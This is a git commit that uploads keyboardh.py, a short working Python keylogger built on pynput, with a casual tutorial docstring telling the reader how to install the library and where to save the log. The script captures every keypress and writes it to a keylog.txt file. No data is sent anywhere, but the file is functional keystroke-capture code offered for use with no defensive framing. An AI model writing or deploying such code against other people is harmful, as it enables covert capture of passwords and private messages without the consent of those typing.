681419dc2a513948d183c822fc65055ad6baa377
Abed Anis <62609383+withoutasoundd@users.noreply.github.com>
2020-04-24 23:09:58 +0100

    Add files via upload

---
+++ keyboardh.py
@@ -0,0 +1,16 @@
+"""1- We're gonna be using pynput so first you gotta have pip installed (i made a tutorial on that), then install 
+pynput by typing in terminal (pip3 install pynput)
+
+2- Create the file where you wanna save the history"""
+from pynput.keyboard import Key, Listener
+import logging
+
+log_directory = r"/root/Desktop/logs/"  #the path to the file where u wanna registrer this 
+
+logging.basicConfig(filename = (log_directory+"keylog.txt"), level = logging.DEBUG)
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press = on_press) as listener:
+    listener.join()
